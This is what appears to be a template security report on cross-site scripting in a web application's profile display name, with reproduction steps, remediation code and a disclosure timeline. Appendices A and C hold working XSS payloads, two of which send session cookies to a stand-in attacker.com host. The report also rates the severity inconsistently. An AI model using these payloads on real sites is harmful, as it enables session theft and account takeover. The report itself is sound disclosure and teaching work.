# Cross-Site Scripting (XSS) in User Profile - Example Report

## Executive Summary

A Cross-Site Scripting (XSS) vulnerability was identified in the user profile page of the web application. This vulnerability allows malicious users to inject and execute arbitrary JavaScript code in other users' browsers, potentially leading to session hijacking, credential theft, and defacement. The vulnerability affects all authenticated users and is rated as **High** severity.

## Vulnerability Details

### Title
Reflected Cross-Site Scripting (XSS) in User Profile Display Name

### Severity
- **CVSS Score**: 6.1
- **Rating**: Medium
- **Vector String**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

### Description
The application fails to properly sanitize user input in the "Display Name" field of user profiles before rendering it in HTML responses. When a malicious payload is submitted as the display name, it gets executed in the context of other users' browsers when they view the affected profile.

The vulnerability occurs because:
1. User input is not validated or sanitized on the server side
2. Output encoding is not applied when displaying the name
3. Content Security Policy (CSP) headers are not implemented

### Affected Systems
- **Application**: UserHub Portal
- **Version**: 2.3.1
- **URL/Endpoint**: `https://example.com/profile/edit` (POST) and `https://example.com/users/{userId}` (GET)
- **Parameters**: `displayName` parameter in profile update request
- **Environment**: Production

## Proof of Concept (PoC)

### Prerequisites
- Valid user account on the application
- Another user account to test the cross-site impact
- Web browser with developer tools

### Steps to Reproduce

1. **Login to the application**
   - Navigate to `https://example.com/login`
   - Login with valid credentials (user: testuser@example.com)

2. **Navigate to profile edit page**
   - Go to `https://example.com/profile/edit`
   - Locate the "Display Name" field

3. **Inject malicious payload**
   - Enter the following payload in the Display Name field:
   ```html
   <script>alert('XSS Vulnerability - Cookie: ' + document.cookie)</script>
   ```
   - Click "Save Profile"

4. **Verify payload storage**
   - Navigate to your profile page: `https://example.com/users/123`
   - Observe that the JavaScript alert executes

5. **Test cross-user impact**
   - Login with a different user account
   - Navigate to the vulnerable user's profile
   - Observe the JavaScript alert executes in the context of the second user

### Expected Result
The application should:
- Sanitize the input and strip HTML/JavaScript tags
- Display the name as plain text: `alert('XSS Vulnerability - Cookie: ' + document.cookie)`
- Not execute any JavaScript code

### Actual Result
- The JavaScript payload executes when the profile is viewed
- An alert box appears showing "XSS Vulnerability - Cookie: [session cookies]"
- The malicious script runs in the context of viewing users' browsers

### Evidence

#### Screenshot 1: Payload Injection
![Payload injection in profile form](screenshots/xss-payload-injection.png)

#### Screenshot 2: JavaScript Execution
![Alert dialog showing XSS execution](screenshots/xss-execution-alert.png)

#### Request Example
```http
POST /profile/edit HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Cookie: sessionId=abc123xyz789

displayName=%3Cscript%3Ealert%28%27XSS%20Vulnerability%20-%20Cookie%3A%20%27%20%2B%20document.cookie%29%3C%2Fscript%3E&email=testuser%40example.com
```

#### Response Example
```http
HTTP/1.1 302 Found
Location: /users/123
Set-Cookie: sessionId=abc123xyz789; HttpOnly
```

#### Vulnerable HTML Output
```html
<div class="profile-header">
  <h2>Welcome, <script>alert('XSS Vulnerability - Cookie: ' + document.cookie)</script></h2>
  <p>Member since: January 2024</p>
</div>
```

## Impact Analysis

### Business Impact
- **Data Breach**: Session cookies and personal information can be stolen
- **Reputation Damage**: Users may lose trust in the application's security
- **Legal Compliance**: Potential violations of data protection regulations (GDPR, CCPA)
- **Financial Impact**: Possible compensation claims and regulatory fines

### Technical Impact
- **Session Hijacking**: Attackers can steal session tokens and impersonate users
- **Data Theft**: Access to sensitive user information and application data
- **Account Takeover**: Complete compromise of user accounts
- **Malware Distribution**: Potential to serve malicious content to users
- **Defacement**: Application interface can be modified maliciously

### Attack Scenario
1. **Initial Compromise**: Attacker creates account and injects malicious JavaScript
2. **Social Engineering**: Attacker shares profile link through social media or email
3. **Payload Execution**: Victims click the link and visit the malicious profile
4. **Data Extraction**: JavaScript executes and sends session cookies to attacker's server
5. **Account Takeover**: Attacker uses stolen sessions to access victim accounts
6. **Lateral Movement**: Process repeats with compromised accounts for wider impact

## Risk Assessment

### Likelihood
**High** - The vulnerability is easy to discover and exploit:
- No special tools required
- Simple payload injection
- Affects all user profiles
- High user interaction (profile viewing)

### Exploitability
**High** - Very easy to exploit:
- **Skill Level**: Low - Basic understanding of HTML/JavaScript
- **Tools**: Standard web browser sufficient
- **Access Requirements**: Valid user account (easy to obtain)
- **Detection Probability**: Low - No logging of XSS attempts

### Affected Users/Systems
- **Users Affected**: All 15,000+ registered users
- **System Criticality**: High - Core user management functionality
- **Data Sensitivity**: High - Contains PII and session information

## Remediation

### Recommended Solution

#### 1. Input Validation and Sanitization
```php
// Before: Vulnerable code
$displayName = $_POST['displayName'];

// After: Secure implementation
$displayName = htmlspecialchars($_POST['displayName'], ENT_QUOTES, 'UTF-8');
// Additional validation
if (strlen($displayName) > 100) {
    $displayName = substr($displayName, 0, 100);
}
```

#### 2. Output Encoding
```php
// In the view template
echo '<h2>Welcome, ' . htmlspecialchars($user->displayName, ENT_QUOTES, 'UTF-8') . '</h2>';
```

#### 3. Content Security Policy (CSP)
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self';
```

#### 4. Additional Security Headers
```http
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

### Temporary Mitigations

While implementing the permanent fix:

1. **Web Application Firewall (WAF) Rule**:
   ```
   # Block common XSS patterns
   SecRule ARGS "@detectXSS" \
     "id:1001,\
      phase:2,\
      block,\
      msg:'XSS Attack Detected',\
      logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"
   ```

2. **Input Length Restriction**:
   - Temporarily limit display name to 50 characters
   - Remove special characters: `<`, `>`, `"`, `'`, `&`

3. **Enhanced Monitoring**:
   - Log all profile update requests
   - Alert on suspicious patterns in display names

### Verification Steps

1. **Code Review**: Verify all user inputs are properly sanitized
2. **Automated Testing**: Run DAST tools to confirm XSS is blocked
3. **Manual Testing**: Attempt various XSS payloads to ensure protection
4. **CSP Testing**: Verify Content Security Policy blocks inline scripts

## References

### Related Vulnerabilities
- [CWE-79: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-80: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/80.html)

### Additional Resources
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Testing Guide - XSS](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
- [Mozilla Developer Network - CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

## Timeline

| Date | Event |
|------|-------|
| 2024-01-15 | Vulnerability discovered during security testing |
| 2024-01-15 | Initial report submitted to development team |
| 2024-01-16 | Development team acknowledged receipt |
| 2024-01-18 | Temporary WAF rules implemented |
| 2024-01-22 | Code fixes developed and tested |
| 2024-01-25 | Fixes deployed to production |
| 2024-01-26 | Fix verification completed |
| 2024-01-30 | Final security testing passed |

## Additional Information

### Testing Environment
- **Tools Used**: 
  - Burp Suite Professional 2023.10
  - OWASP ZAP 2.14.0
  - Browser Developer Tools
  - Custom Python scripts for automation

- **Testing Methodology**: 
  - Manual code review
  - Automated vulnerability scanning
  - Penetration testing
  - Social engineering simulation

- **Scope**: 
  - User profile management module
  - Authentication system
  - Session management

### Compliance Considerations
This vulnerability impacts compliance with:
- **PCI-DSS**: Requirement 6.5.7 (Cross-site scripting)
- **OWASP Top 10 2021**: A03 - Injection
- **NIST Cybersecurity Framework**: PR.DS-5 (Data integrity protection)
- **ISO 27001**: A.14.2.1 (Secure development policy)

## Appendices

### Appendix A: Additional Test Payloads

The following payloads were also successful:

```javascript
// Basic alert
<script>alert(1)</script>

// Cookie theft
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

// DOM manipulation
<img src=x onerror="document.body.innerHTML='<h1>Hacked!</h1>'">

// Event handler
<div onmouseover="alert('XSS')" style="position:fixed;top:0;left:0;width:100%;height:100%;"></div>

// SVG vector
<svg onload="alert('XSS')">
```

### Appendix B: Scanner Output

```
[High] Cross-Site Scripting (XSS) - Reflected
URL: https://example.com/users/123
Parameter: displayName
Payload: <script>alert('XSS')</script>
Confidence: High
Severity: High

Recommendation: Implement proper input validation and output encoding
```

### Appendix C: Network Traffic Analysis

```http
# Malicious request
POST /profile/edit HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0...
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

displayName=<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

# Response showing vulnerability
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<html>
<body>
<h2>Welcome, <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>!</h2>
</body>
</html>
```

---

**Report Prepared By**: Security Team - John Smith (john.smith@company.com)
**Date**: 2024-01-15
**Version**: 1.0
**Classification**: Confidential - Internal Use Only
**Next Review**: 2024-04-15
